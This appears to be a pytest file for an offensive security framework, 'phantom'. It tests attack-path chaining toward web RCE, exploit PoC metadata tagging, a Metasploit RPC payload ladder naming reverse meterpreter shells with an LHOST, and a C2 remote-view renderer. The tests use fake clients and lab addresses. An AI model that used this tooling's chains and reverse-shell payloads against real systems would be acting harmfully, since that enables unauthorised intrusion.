"""Tests for the manual-core upgrades: attack-path chaining (composition
engine exposed with approval gates), PoC-sync metadata tagging, and the
MSF RPC escalation ladder."""
import ast
import io

import pytest

from phantom.core import chain


# ── chain planning ──────────────────────────────────────────────────────────

def _wm_with_web_facts():
    from phantom.core.knowledge import reset_wm
    wm = reset_wm("10.0.0.5")
    wm.add_finding("web_app", "http://10.0.0.5",
                   {"base_url": "http://10.0.0.5"},
                   confidence=0.9, source="test")
    wm.add_finding("hunt_anomaly", "upload",
                   {"class": "upload", "endpoint": "/upload"},
                   confidence=0.8, source="test")
    wm.add_finding("hunt_anomaly", "sqli",
                   {"class": "sqli", "endpoint": "/item?id=1"},
                   confidence=0.8, source="test")
    return wm


def test_chain_plan_empty_world():
    """No facts -> no composable chains (clean, not an error)."""
    from phantom.core.knowledge import reset_wm
    assert chain.plan(reset_wm("")) == []


def test_chain_plan_finds_rce_and_creds_paths():
    """Web facts compose into concrete attack paths with mapped caps."""
    plans = chain.plan(_wm_with_web_facts())
    goals = {p["goal"] for p in plans}
    assert "rce.web" in goals
    rce = next(p for p in plans if p["goal"] == "rce.web")
    ops = [s["op"] for s in rce["steps"]]
    assert ops == ["web.upload_shell", "web.write_rce"]
    # every step is either manually executable or marked engine-only
    for s in rce["steps"]:
        assert s["cap"] or "engine-only" in s["note"]


def test_chain_plan_sorted_cheapest_first():
    plans = chain.plan(_wm_with_web_facts())
    costs = [p["cost"] for p in plans]
    assert costs == sorted(costs)


def test_chain_step_maps_to_real_capabilities():
    """Mapped operators point at capabilities that exist in the registry."""
    from phantom.automation.guidance.commands import make_registry
    reg = make_registry()
    for op_id, (cap_id, _note) in chain._OP_TO_CAP.items():
        assert reg.get(cap_id) is not None, f"{op_id} -> {cap_id} missing"


def test_chain_execute_step_refuses_engine_only():
    ok, msg = chain.execute_step({"op": "web.write_rce", "cap": None}, "10.0.0.5")
    assert not ok and "engine-only" in msg


# ── poc-sync metadata tagging ───────────────────────────────────────────────

def test_poc_sync_tag_writes_metadata(tmp_path):
    """Tagging prepends a parseable METADATA block like _get_meta expects."""
    from phantom.modules.exploit import ExploitModule, _DEFAULT_EXPLOIT_TIMEOUT
    poc = tmp_path / "edb12345_test.py"
    poc.write_text("print('poc')\n", encoding="utf-8")
    m = ExploitModule()
    m._tag_poc_metadata(str(poc), {
        "name": "Test PoC", "description": "d", "port": "8080",
        "cve": "CVE-2024-99999", "timeout": _DEFAULT_EXPLOIT_TIMEOUT})
    meta = m._get_meta(str(poc))
    assert meta["cve"] == "CVE-2024-99999"
    assert meta["port"] == "8080"
    assert meta["name"] == "Test PoC"


def test_exploit_module_exposes_new_commands():
    from phantom.modules.exploit import ExploitModule
    cmds = ExploitModule().build_commands()
    assert "chain" in cmds["CORE"] and "poc-sync" in cmds["CORE"]
    assert "msf-fire <cve>" in cmds["MSF"]


# ── msf-fire escalation ladder ──────────────────────────────────────────────

def test_msf_payload_variants_os_aware():
    """Windows/unknown targets get escalating ladders ending on module default."""
    from phantom.core.knowledge import reset_wm
    from phantom.modules.exploit import ExploitModule
    m = ExploitModule()

    reset_wm("10.0.0.9")
    ladder = m._msf_payload_variants("exploit/multi/http/x")
    assert ladder[-1] == ""  # module default last
    assert all(isinstance(x, str) for x in ladder)

    wm = reset_wm("10.0.0.9")
    wm.add_finding("os", "os", {"os": "Windows Server 2019"},
                   confidence=0.8, source="test")
    win_ladder = m._msf_payload_variants("exploit/multi/http/x")
    assert win_ladder[0] == "windows/x64/meterpreter/reverse_tcp"

    wm = reset_wm("10.0.0.9")
    wm.add_finding("os", "os", {"os": "Linux 5.x"},
                   confidence=0.8, source="test")
    linux_ladder = m._msf_payload_variants("exploit/multi/http/x")
    assert linux_ladder[0] == "linux/x64/meterpreter/reverse_tcp"


def test_msf_rpc_run_exploit_sets_lhost_for_reverse(monkeypatch):
    """Reverse payloads must carry LHOST; non-reverse must not."""
    from phantom.core import msf_rpc

    captured = {}

    class FakeClient:
        token = "t"

        def _authed(self, method, *args):
            captured.setdefault(method, []).append(args)
            if method == "session.list":
                return {}
            return {}

    monkeypatch.setattr(msf_rpc, "connect", lambda: FakeClient())
    res = msf_rpc.run_exploit("exploit/multi/http/x", "10.0.0.9", "8080",
                              payload="windows/x64/meterpreter/reverse_tcp",
                              lhost="192.168.1.155", timeout=0.1)
    opts = captured["module.execute"][0][2]
    assert opts["LHOST"] == "192.168.1.155"
    assert res["ok"] is False  # no session within timeout=0.1


def test_msf_rpc_non_reverse_has_no_lhost(monkeypatch):
    from phantom.core import msf_rpc

    captured = {}

    class FakeClient:
        token = "t"

        def _authed(self, method, *args):
            captured.setdefault(method, []).append(args)
            return {}

    monkeypatch.setattr(msf_rpc, "connect", lambda: FakeClient())
    msf_rpc.run_exploit("exploit/multi/http/x", "10.0.0.9", "8080",
                        payload="cmd/unix/bind_bash", timeout=0.1)
    opts = captured["module.execute"][0][2]
    assert "LHOST" not in opts


# ── remote-view ascii renderer ─────────────────────────────────────────────

def test_ascii_frame_renders_gradient():
    """The CLI live-view renderer downscales frames to char rows."""
    from PIL import Image
    from phantom.core.c2_shell import C2Shell
    img = Image.new("L", (320, 240))
    for x in range(320):
        for y in range(240):
            img.putpixel((x, y), x * 255 // 320)
    buf = io.BytesIO()
    img.save(buf, "JPEG")
    art = C2Shell._ascii_frame(buf.getvalue())
    rows = art.split("\n")
    assert 10 <= len(rows) <= 80
    # gradient: left edge dark chars, right edge bright chars
    assert rows[0][0] in " .:-" and rows[0][-1] in "+*#%@"
